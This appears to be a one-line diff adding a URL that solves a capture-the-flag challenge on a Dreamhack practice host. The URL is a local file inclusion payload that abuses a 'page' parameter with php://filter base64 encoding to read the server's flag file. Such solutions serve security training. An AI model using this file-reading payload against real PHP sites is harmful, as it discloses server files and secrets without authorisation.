@@ -1,0 +1,1 @@
+http://host2.dreamhack.games:19754/?page=php://filter/convert.base64-encode/resource=/var/www/uploads/flag
